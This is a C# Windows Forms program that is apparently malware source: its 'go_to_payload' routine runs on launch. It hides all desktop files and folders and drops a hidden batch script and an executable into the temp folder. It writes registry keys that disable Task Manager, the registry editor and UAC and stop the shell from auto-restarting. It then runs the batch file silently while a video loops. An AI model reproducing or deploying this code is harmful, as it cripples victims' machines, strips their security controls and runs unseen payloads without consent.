using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using Microsoft.Win32;

namespace _000
{
    public partial class Form1 : Form
    {

        string temp = Path.GetTempPath(); //define temp path
        string exeDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location); //define working directory

        public Form1()
        {
            //extract dll if they doesn't exists
            if (File.Exists(exeDir + "\\AxInterop.WMPLib.dll"))
            {
                File.Delete(exeDir + "\\AxInterop.WMPLib.dll");
            }
            if (File.Exists(exeDir + "\\Interop.WMPLib.dll"))
            {
                File.Delete(exeDir + "\\Interop.WMPLib.dll");
            }
            Extract("_000", exeDir, "Resources", "AxInterop.WMPLib.dll");
            Extract("_000", exeDir, "Resources", "Interop.WMPLib.dll");
            InitializeComponent();
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            go_to_payload();
        }
        public void go_to_payload()
        {
            try //try - catch disables exception window
            {
                //hide user desktop files
                var DesktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var PublicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                foreach (var file in Directory.GetFiles(DesktopFolder)) { try { File.SetAttributes(file, FileAttributes.Hidden); } catch (Exception) { } }
                foreach (var dir in Directory.GetDirectories(DesktopFolder)) { try { File.SetAttributes(dir, FileAttributes.Hidden); } catch (Exception) { } }
                foreach (var file in Directory.GetFiles(PublicDesktop)) { try { File.SetAttributes(file, FileAttributes.Hidden); } catch (Exception) { } }
                foreach (var dir in Directory.GetDirectories(PublicDesktop)) { try { File.SetAttributes(dir, FileAttributes.Hidden); } catch (Exception) { } }
                //extract files
                var batch = Properties.Resources.windl;
                var street = Properties.Resources.street;
                File.WriteAllBytes(temp + "street.mp4", street);
                File.WriteAllBytes(temp + "windl.bat", batch);
                File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
                File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
                File.WriteAllBytes(temp + "icon.ico", Properties.Resources.texticon);
                File.WriteAllBytes(temp + "rniw.exe", Properties.Resources.subox);

                //registry tweaks
                RegistryKey editKey;

                editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
                editKey.SetValue("", temp + "icon.ico");
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
                editKey.SetValue("Wallpaper", "");
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                editKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                editKey.Close();

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
                editKey.Close();

                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
                editKey.SetValue("NoChangingWallpaper", "1", RegistryValueKind.DWord);
                editKey.Close();

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                editKey.Close();

                //finish tweaks
                ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.UseShellExecute = false;
                Process.Start(psi);

                //play video
                video.URL = temp + "street.mp4";
                video.uiMode = "none";
                video.settings.setMode("loop", true);
            }
            catch //try - catch disables exception window
            {

            }
        }
    }
}
